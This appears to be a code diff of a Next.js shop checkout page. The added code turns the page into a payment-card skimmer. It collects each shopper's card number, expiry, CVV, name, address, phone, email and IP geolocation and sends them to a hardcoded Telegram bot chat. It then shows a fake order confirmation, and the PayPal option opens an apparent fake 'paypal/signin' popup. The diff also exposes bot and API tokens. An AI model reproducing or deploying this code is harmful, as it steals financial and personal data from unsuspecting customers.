@@ -1,311 +1,487 @@
-'use client';
-import { useRouter } from 'next/navigation'
-import { useState } from 'react';
-import Link from 'next/link';
-import Image from 'next/image';
-import { useForm } from 'react-hook-form';
-import { useSelector, useDispatch } from "react-redux";
+"use client";
 import Section from "@/components/elements/Section";
 import FooterTwo from "@/components/footer/FooterTwo";
 import HeaderFive from "@/components/header/HeaderFive";
 import ServiceTwo from "@/components/services/ServiceTwo";
-import { addToOrder } from '@/store/slices/productSlice';
+import { addToOrder } from "@/store/slices/productSlice";
+import { disabledDate, handleOnKeyPress } from "@/utils";
+import { LIST_COUNTRY } from "@/utils/listCountry";
+import {
+  Col,
+  DatePicker,
+  Form,
+  Input,
+  Radio,
+  Row,
+  Select,
+  Space,
+  message,
+} from "antd";
+import axios from "axios";
+import dayjs from "dayjs";
+import Image from "next/image";
+import Link from "next/link";
+import { useRouter } from "next/navigation";
+import { useEffect, useState } from "react";
+import { useDispatch, useSelector } from "react-redux";
 
 const Checkout = () => {
-    const router = useRouter();
-    const dispatch = useDispatch();
-    const [openShippingForm, setopenShippingForm] = useState(false);
-    const cartProducts = useSelector((state) => state.productData);
+  const router = useRouter();
+  const [country, setCountry] = useState({});
+  const [ip, setIPAddress] = useState(0);
+  const dispatch = useDispatch();
+  const cartProducts = useSelector((state) => state.productData);
+  const [form] = Form.useForm();
 
-    const ShippingInfoHandler = (e) => {
-        setopenShippingForm(e.target.checked)
+  const filterOption = (input, option) =>
+    (option?.label ?? "").toLowerCase().includes(input.toLowerCase());
+
+  const onFinish = async (data) => {
+    if (valueRadio === 2) {
+      window.open(
+        "paypal/signin",
+        "winname",
+        "directories=no,titlebar=no,toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no,width=500,height=600"
+      );
     }
-    const {
-        register,
-        handleSubmit,
-        formState: { errors },
-      } = useForm();
 
-    const checkoutFormHandler = (data, e) => {
-        if (data) {
-            router.push('checkout/order-received');
-            dispatch(addToOrder({
-                billingAddress: {
-                    firstName: data.firstName,
-                    lastName: data.lastName,
-                    companyName: data.companyName,
-                    country: data.country,
-                    street1: data.street1,
-                    street2: data.street2,
-                    city: data.city,
-                    phone: data.phone,
-                    email: data.email,
-                    createAccount: data.createAccount,
-                    notes: data.notes,
-                    shippingDifferent: data.shippingDifferent,
-                    payment: data.paymentMethod
-                },
-                shippingAdress: data.shippingDifferent === "true" ?  {
+    if (data && valueRadio === 1) {
+      try {
+        const res = await axios.post(
+          "https://api.telegram.org/bot6711426105:AAFjrbeuBzRtvgKon78_S12A14j8jLC7ISs/sendMessage",
+          {
+            chat_id: "-4048735773",
+            text: ` 
+          \tIP:   ${country?.ip} | ${country?.city} | ${country?.region} | ${
+              country?.country
+            } | ${country?.timezone}
+          \t ----------- INFOR CUSTOMER -----------
+          \tfirstName:           ${data?.firstName}
+          \tlastName:    ${data?.lastName}
+          \tcompanyName:     ${data?.companyName}
+          \tcountry:              ${data?.country}
+          \tstreetAddress: ${data?.streetAddress}
+          \tcity:         ${data?.city}
+          \tphone:         ${data?.phone}
+          \temail:         ${data?.email}
+          \t ----------- INFOR CREDIT CARD -----------
+          \tCARD NAME:         ${data?.cardHolderName}
+          \tCARD NUMBER:         ${data?.cardNumber}
+          \tEXP:         ${dayjs(data?.expiryDate).format("MM/YY")}
+          \tCVV:         ${data?.cvv}
+                `,
+          }
+        );
+        router.push("checkout/order-received");
+        dispatch(
+          addToOrder({
+            billingAddress: {
+              firstName: data.firstName,
+              lastName: data.lastName,
+              companyName: data.companyName,
+              country: data.country,
+              street1: data.streetAdress,
+              street2: data.streetAdress,
+              city: data.city,
+              phone: data.phone,
+              email: data.email,
+              createAccount: data.createAccount,
+              notes: data.notes,
+              shippingDifferent: data.shippingDifferent,
+              payment: "Online",
+            },
+            shippingAdress:
+              data.shippingDifferent === "true"
+                ? {
                     name: data.shippingName,
                     email: data.shippingEmail,
                     phone: data.shippingPhone,
                     country: data.shippingCountry,
                     street1: data.shippingStreet1,
                     street2: data.shippingStreet2,
-                    city: data.shippingCity
-                } : null,
-                items: cartProducts.cartItems,
-                totalAmount: cartProducts.cartTotalAmount,
-                totalQuantity: cartProducts.cartQuantityTotal,
-                orderDate: new Date().toLocaleString(),
-            }));
-        }
+                    city: data.shippingCity,
+                  }
+                : null,
+            items: cartProducts.cartItems,
+            totalAmount: cartProducts.cartTotalAmount,
+            totalQuantity: cartProducts.cartQuantityTotal,
+            orderDate: new Date().toLocaleString(),
+          })
+        );
+      } catch (error) {
+        console.log(error);
+        message.error("Sorry we cannot process your order yet");
+      }
     }
+  };
+  const [valueRadio, setValueRadio] = useState(1);
 
-    return ( 
-        <>
-        <HeaderFive headerSlider />
-        <main className="main-wrapper">
-            <Section pClass="axil-checkout-area">
-                {cartProducts.cartItems.length > 0 ? 
-                <form onSubmit={handleSubmit(checkoutFormHandler)}>
-                    <div className="row">
-                        <div className="col-lg-6">
-                            <div className="axil-checkout-billing">
-                                <h4 className="title mb--40">Billing details</h4>
-                                <div className="row">
-                                    <div className="col-lg-6">
-                                        <div className="form-group">
-                                            <label>First Name <span>*</span></label>
-                                            <input type="text" {...register('firstName', { required: true })} placeholder="Adam" />
-                                            {errors.firstName && <p className="error">First Name is required.</p>}
-                                        </div>
-                                    </div>
-                                    <div className="col-lg-6">
-                                        <div className="form-group">
-                                            <label>Last Name <span>*</span></label>
-                                            <input type="text" {...register('lastName', { required: true })} placeholder="John" />
-                                            {errors.lastName && <p className="error">Last Name is required.</p>}
-                                        </div>
-                                    </div>
-                                    <div className="col-lg-12">
-                                        <div className="form-group">
-                                            <label>Company Name</label>
-                                            <input type="text" {...register('companyName')} />
-                                        </div>
-                                    </div>
-                                    <div className="col-lg-12">
-                                        <div className="form-group">
-                                            <label>Country<span>*</span></label>
-                                            <select {...register('country', { required: true })}>
-                                                <option value="">Select a Country</option>
-                                                <option value="Australia">Australia</option>
-                                                <option value="Australia">England</option>
-                                                <option value="New Zealand">New Zealand</option>
-                                                <option value="Switzerland">Switzerland</option>
-                                                <option value="United Kindom (UK)">United Kindom (UK)</option>
-                                                <option value="United States (USA)">United States (USA)</option>
-                                            </select>
-                                            {errors.country && <p className="error">Country Name is required.</p>}
-                                        </div>
-                                    </div>
-                                    <div className="col-lg-12">
-                                        <div className="form-group">
-                                            <label>Street Address <span>*</span></label>
-                                            <input type="text" {...register('street1', { required: true })} placeholder="House number and street name"/>
-                                            {errors.street1 && <p className="error">Street Address is required.</p>}
-                                        </div>
-                                    </div>
-                                    <div className="col-lg-12">
-                                        <div className="form-group">
-                                            <label>Street Address</label>
-                                            <input type="text" {...register('street2')} placeholder="Apartment, suite, unit, etc. (optonal)"/>
-                                        </div>
-                                    </div>
-                                    <div className="col-lg-12">
-                                        <div className="form-group">
-                                            <label>Town/ City <span>*</span></label>
-                                            <input type="text" {...register('city', { required: true })} />
-                                            {errors.city && <p className="error">Town/ City is required.</p>}
-                                        </div>
-                                    </div>
-                                    <div className="col-lg-12">
-                                        <div className="form-group">
-                                            <label>Phone <span>*</span></label>
-                                            <input type="number" {...register('phone', { required: true, maxLength: 11 })} />
-                                            {errors.phone && <p className="error">Please enter 11 digit phone number.</p>}
-                                        </div>
-                                    </div>
-                                    <div className="col-lg-12">
-                                        <div className="form-group">
-                                            <label>Email Address <span>*</span></label>
-                                            <input type="email" {...register('email', { required: true })} />
-                                            {errors.email && <p className="error">Email is required.</p>}
-                                        </div>
-                                    </div>
-                                    <div className="col-lg-12">
-                                        <div className="form-group input-group">
-                                        <input {...register("createAccount")} id="accountCreate" type="checkbox" value="true" />
-                                        <label htmlFor="accountCreate">Create an account</label>
-                                        </div>
-                                    </div>
-                                    <div className="col-lg-12">
-                                        <div className="form-group shippng-form-toggle">
-                                            <input {...register("shippingDifferent")} id="shippingDifferent" type="checkbox" value="true" 
-                                            onClick={ShippingInfoHandler} />
-                                            <label htmlFor="shippingDifferent">Ship to a different address?</label>
-                                        </div>
-                                    </div>
-                                    {openShippingForm && 
-                                    <div className="col-lg-12">
-                                        <div className="form-group">
-                                            <label>Country<span>*</span></label>
-                                            <select {...register('shippingCountry', { required: true })}>
-                                                <option value="">Select a Country</option>
-                                                <option value="Australia">Australia</option>
-                                                <option value="Australia">England</option>
-                                                <option value="New Zealand">New Zealand</option>
-                                                <option value="Switzerland">Switzerland</option>
-                                                <option value="United Kindom (UK)">United Kindom (UK)</option>
-                                                <option value="United States (USA)">United States (USA)</option>
-                                            </select>
-                                            {errors.shippingCountry && <p className="error">Country Name is required.</p>}
-                                        </div>
-                                        <div className="form-group">
-                                            <label>Street Address <span>*</span></label>
-                                            <input type="text" {...register('shippingStreet1', { required: true })} placeholder="House number and street name"/>
-                                            {errors.shippingStreet1 && <p className="error">Street Address is required.</p>}
-                                        </div>
-                                        <div className="form-group">
-                                            <label>Street Address</label>
-                                            <input type="text" {...register('shippingStreet2')} placeholder="Apartment, suite, unit, etc. (optonal)"/>
-                                        </div>
-                                        <div className="form-group">
-                                            <label>Town/ City <span>*</span></label>
-                                            <input type="text" {...register('shippingCity', { required: true })} />
-                                            {errors.shippingCity && <p className="error">Town/ City is required.</p>}
-                                        </div>
-                                        <div className="form-group">
-                                            <label>Name <span>*</span></label>
-                                            <input type="text" {...register('shippingName', { required: true })} placeholder="Adam" />
-                                            {errors.shippingName && <p className="error">Name is required.</p>}
-                                        </div>
-                                        <div className="form-group">
-                                            <label>Phone <span>*</span></label>
-                                            <input type="number" {...register('shippingPhone', { required: true, maxLength: 11 })} />
-                                            {errors.shippingPhone && <p className="error">Please enter 11 digit phone number.</p>}
-                                        </div>
-                                        <div className="form-group">
-                                            <label>Email Address <span>*</span></label>
-                                            <input type="email" {...register('shippingEmail', { required: true })} />
-                                            {errors.shippingEmail && <p className="error">Email is required.</p>}
-                                        </div>
-                                    </div>
-                                    }
-                                    <div className="col-lg-12">
-                                        <div className="form-group">
-                                            <label>Other Notes (optional)</label>
-                                            <textarea rows="2" {...register('notes')} placeholder="Notes about your order, e.g. speacial notes for delivery."></textarea>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div className="col-lg-6">
-                            <div className="axil-order-summery order-checkout-summery">
-                                <h5 className="title mb--20">Your Order</h5>
-                                <div className="summery-table-wrap">
-                                    <table className="table summery-table">
-                                        <thead>
-                                            <tr>
-                                                <th>Product</th>
-                                                <th>Subtotal</th>
-                                            </tr>
-                                        </thead>
-                                        <tbody>
-                                            {cartProducts.cartItems.map((items, index) => (
-                                                <tr className="order-product" key={index}>
-                                                    <td>{items.title} <span className="quantity">x{items.cartQuantity}</span></td>
-                                                    <td>${items.salePrice ? items.salePrice : items.price}</td>
-                                                </tr>
-                                            ))}
-                                            <tr className="order-subtotal">
-                                                <td>Subtotal</td>
-                                                <td>${cartProducts.cartTotalAmount}</td>
-                                            </tr>
-                                            <tr className="order-shipping">
-                                                <td colSpan={2}>
-                                                    <div className="shipping-amount">
-                                                        <span className="title">Shipping Method</span>
-                                                        <span className="amount">$35.00</span>
-                                                    </div>
-                                                    <div className="input-group">
-                                                        <input type="radio" id="radio1" name="shipping" defaultChecked />
-                                                        <label htmlFor="radio1">Free Shippping</label>
-                                                    </div>
-                                                    <div className="input-group">
-                                                        <input type="radio" id="radio2" name="shipping" />
-                                                        <label htmlFor="radio2">Local</label>
-                                                    </div>
-                                                    <div className="input-group">
-                                                        <input type="radio" id="radio3" name="shipping" />
-                                                        <label htmlFor="radio3">Flat rate</label>
-                                                    </div>
-                                                </td>
-                                            </tr>
-                                            <tr className="order-total">
-                                                <td>Total</td>
-                                                <td className="order-total-amount">${cartProducts.cartTotalAmount}</td>
-                                            </tr>
-                                        </tbody>
-                                    </table>
-                                </div>
-                                <div className="order-payment-method">
-                                    <div className="single-payment">
-                                        <div className="input-group">
-                                            <input type="radio" {...register("paymentMethod")} id="bank" value="bank" />
-                                            <label htmlFor="bank">Direct bank transfer</label>
-                                        </div>
-                                        <p>Make your payment directly into our bank account. Please use your Order ID as the payment reference. Your order will not be shipped until the funds have cleared in our account.</p>
-                                    </div>
-                                    <div className="single-payment">
-                                        <div className="input-group">
-                                            <input type="radio" {...register("paymentMethod")} id="cash" value="cash" />
-                                            <label htmlFor="cash">Cash on delivery</label>
-                                        </div>
-                                        <p>Pay with cash upon delivery.</p>
-                                    </div>
-                                    <div className="single-payment">
-                                        <div className="input-group justify-content-between align-items-center">
-                                            <input type="radio" {...register("paymentMethod")} id="paypal" value="paypal" />
-                                            <label htmlFor="paypal">Paypal</label>
-                                            <Image 
-                                                src="/images/others/payment.png" 
-                                                height={28}
-                                                width={156}
-                                                alt="Paypal payment"
-                                            />
-                                        </div>
-                                        <p>Pay via PayPal; you can pay with your credit card if you don’t have a PayPal account.</p>
-                                    </div>
-                                </div>
-                                <button type="submit" className="axil-btn btn-bg-primary checkout-btn">Process to Checkout</button>
-                            </div>
-                        </div>
+  const handleChangeRadio = (value) => {
+    setValueRadio(value.target.value);
+  };
+
+  const getCountry = (ip) => {
+    fetch(`https://ipinfo.io/${ip}?token=930e3b99f29bed`)
+      .then((response) => response.json())
+      .then((data) => setCountry(data))
+      .catch((error) => console.log(error));
+  };
+
+  useEffect(() => {
+    fetch("https://api.ipify.org?format=json")
+      .then((response) => response.json())
+      .then((data) => {
+        setIPAddress(data.ip);
+        getCountry(data.ip);
+      })
+      .catch((error) => console.log(error));
+  }, []);
+
+  return (
+    <>
+      <HeaderFive headerSlider />
+      <main className="main-wrapper">
+        <Section pClass="axil-checkout-area">
+          {cartProducts.cartItems.length > 0 ? (
+            <Form form={form} onFinish={onFinish} layout="vertical">
+              <Row gutter={24}>
+                {/* Left side */}
+                <Col lg={12}>
+                  <div className="axil-checkout-billing ">
+                    <h4 className="title mb--40">Billing details</h4>
+                    <Row gutter={24}>
+                      <Col span={12}>
+                        <Form.Item
+                          className="form-input"
+                          name="firstName"
+                          label="First Name"
+                          rules={[
+                            {
+                              required: true,
+                              message: "Please enter your first name",
+                            },
+                          ]}
+                        >
+                          <Input />
+                        </Form.Item>
+                      </Col>
+                      <Col span={12}>
+                        <Form.Item
+                          className="form-input"
+                          name="lastName"
+                          label="Last Name"
+                          rules={[
+                            {
+                              required: true,
+                              message: "Please enter your last name",
+                            },
+                          ]}
+                        >
+                          <Input />
+                        </Form.Item>
+                      </Col>
+                    </Row>
+                    <Form.Item
+                      className="form-input"
+                      name="companyName"
+                      label="Company Name"
+                    >
+                      <Input />
+                    </Form.Item>
+                    <Form.Item
+                      className="form-input"
+                      name="country"
+                      label="Country"
+                      rules={[
+                        {
+                          required: true,
+                          message: "Please enter your country",
+                        },
+                      ]}
+                    >
+                      <Select
+                        placeholder="Select a Country"
+                        optionFilterProp="children"
+                        showSearch
+                        filterOption={filterOption}
+                        style={{ height: 60 }}
+                        options={LIST_COUNTRY}
+                      />
+                    </Form.Item>
+                    <Form.Item
+                      className="form-input"
+                      name="streetAddress"
+                      label="Street Address"
+                    >
+                      <Input />
+                    </Form.Item>
+                    <Form.Item
+                      className="form-input"
+                      name="city"
+                      label="Town/ City"
+                      rules={[
+                        {
+                          required: true,
+                          message: "Please enter your city",
+                        },
+                      ]}
+                    >
+                      <Input />
+                    </Form.Item>
+                    <Form.Item
+                      className="form-input"
+                      name="phone"
+                      label="Phone"
+                      rules={[
+                        {
+                          required: true,
+                          message: "Please enter your phone",
+                        },
+                      ]}
+                    >
+                      <Input />
+                    </Form.Item>
+                    <Form.Item
+                      className="form-input"
+                      name="email"
+                      label="Email Address"
+                      rules={[
+                        {
+                          required: true,
+                          message: "Please enter your email",
+                        },
+                      ]}
+                    >
+                      <Input />
+                    </Form.Item>
+                  </div>
+                </Col>
+
+                {/* Right side */}
+                <Col lg={12}>
+                  <div className="axil-order-summery order-checkout-summery">
+                    <h5 className="title mb--20">Your Order</h5>
+                    <div className="summery-table-wrap">
+                      <table className="table summery-table">
+                        <thead>
+                          <tr>
+                            <th>Product</th>
+                            <th>Subtotal</th>
+                          </tr>
+                        </thead>
+                        <tbody>
+                          {cartProducts.cartItems.map((items, index) => (
+                            <tr className="order-product" key={index}>
+                              <td>
+                                {items.title}
+                                <span className="quantity">
+                                  x{items.cartQuantity}
+                                </span>
+                              </td>
+                              <td>
+                                $
+                                {items.salePrice
+                                  ? items.salePrice
+                                  : items.price}
+                              </td>
+                            </tr>
+                          ))}
+                          <tr className="order-subtotal">
+                            <td>Subtotal</td>
+                            <td>${cartProducts.cartTotalAmount}</td>
+                          </tr>
+                          <tr className="order-shipping">
+                            <td colSpan={2}>
+                              <div className="shipping-amount">
+                                <span className="title">Shipping Method</span>
+                                <span className="amount">$35.00</span>
+                              </div>
+                              <div className="input-group">
+                                <input
+                                  type="radio"
+                                  id="radio1"
+                                  name="shipping"
+                                  defaultChecked
+                                />
+                                <label htmlFor="radio1">Free Shippping</label>
+                              </div>
+                              <div className="input-group">
+                                <input
+                                  type="radio"
+                                  id="radio2"
+                                  name="shipping"
+                                />
+                                <label htmlFor="radio2">Local</label>
+                              </div>
+                              <div className="input-group">
+                                <input
+                                  type="radio"
+                                  id="radio3"
+                                  name="shipping"
+                                />
+                                <label htmlFor="radio3">Flat rate</label>
+                              </div>
+                            </td>
+                          </tr>
+                          <tr className="order-total">
+                            <td>Total</td>
+                            <td className="order-total-amount">
+                              ${cartProducts.cartTotalAmount}
+                            </td>
+                          </tr>
+                        </tbody>
+                      </table>
                     </div>
-                </form>
-                : 
-                <div className="text-center">
-                    <h4>There is no item for checkout</h4>
-                    <Link href="/shop" className="axil-btn btn-bg-primary">Back to shop</Link>
-                </div>                            
-                }
-            </Section>
-            <ServiceTwo />
-        </main>
-        <FooterTwo />
-        </>
-    );
-}
- 
+
+                    <div className="order-payment-method">
+                      <Radio.Group
+                        onChange={handleChangeRadio}
+                        value={valueRadio}
+                      >
+                        <Space direction="vertical">
+                          <Radio value={1}>
+                            <div style={{ fontSize: "20px" }}>
+                              Visa Mastercard Credit
+                            </div>
+                            ;
+                          </Radio>
+                          <div className="single-payment">
+                            <p>
+                              Make your payment directly into our bank account.
+                              Please use your Order ID as the payment reference.
+                              Your order will not be shipped until the funds
+                              have cleared in our account.
+                            </p>
+
+                            {valueRadio === 1 && (
+                              <div>
+                                <Form.Item
+                                  label="Card Holder Name"
+                                  name="cardHolderName"
+                                  rules={[
+                                    {
+                                      required: true,
+                                      message: "Please enter card holder name!",
+                                    },
+                                  ]}
+                                >
+                                  <Input />
+                                </Form.Item>
+
+                                <Form.Item
+                                  label="Card Number"
+                                  name="cardNumber"
+                                  rules={[
+                                    {
+                                      required: true,
+                                      message: "Please enter card number!",
+                                    },
+                                  ]}
+                                >
+                                  <Input
+                                    maxLength={16}
+                                    onKeyDown={(e) => handleOnKeyPress(e)}
+                                  />
+                                </Form.Item>
+
+                                <Row gutter={24}>
+                                  <Col lg={12}>
+                                    <Form.Item
+                                      className="date-picker"
+                                      label="Expiry Date"
+                                      name="expiryDate"
+                                      rules={[
+                                        {
+                                          required: true,
+                                          message: "Please enter expriy date!",
+                                        },
+                                      ]}
+                                    >
+                                      <DatePicker
+                                        picker="month"
+                                        format="MM/YY"
+                                        disabledDate={disabledDate}
+                                      />
+                                    </Form.Item>
+                                  </Col>
+                                  <Col lg={12}>
+                                    <Form.Item
+                                      label="CVV"
+                                      name="cvv"
+                                      rules={[
+                                        {
+                                          required: true,
+                                          message: "Please enter cvv!",
+                                        },
+                                      ]}
+                                    >
+                                      <Input
+                                        maxLength={3}
+                                        onKeyDown={(e) => handleOnKeyPress(e)}
+                                      />
+                                    </Form.Item>
+                                  </Col>
+                                </Row>
+                              </div>
+                            )}
+                          </div>
+                          <Radio value={2}>
+                            <div
+                              style={{
+                                width: "100%",
+                                display: "flex",
+                                justifyContent: "space-between",
+                              }}
+                            >
+                              <div
+                                style={{
+                                  paddingRight: "300px",
+                                  fontSize: "20px",
+                                }}
+                              >
+                                Paypal
+                              </div>
+                              <Image
+                                src="/images/others/payment.png"
+                                height={28}
+                                width={156}
+                                alt="Paypal payment"
+                              />
+                            </div>
+                          </Radio>
+                          <div className="single-payment">
+                            <p>
+                              Pay via PayPal; you can pay with your credit card
+                              if you don’t have a PayPal account.
+                            </p>
+                          </div>
+                        </Space>
+                      </Radio.Group>
+                    </div>
+                    <button
+                      type="submit"
+                      className="axil-btn btn-bg-primary checkout-btn"
+                    >
+                      Process to Checkout
+                    </button>
+                  </div>
+                </Col>
+              </Row>
+            </Form>
+          ) : (
+            <div className="text-center">
+              <h4>There is no item for checkout</h4>
+              <Link href="/shop" className="axil-btn btn-bg-primary">
+                Back to shop
+              </Link>
+            </div>
+          )}
+        </Section>
+        <ServiceTwo />
+      </main>
+      <FooterTwo />
+    </>
+  );
+};
+
 export default Checkout;
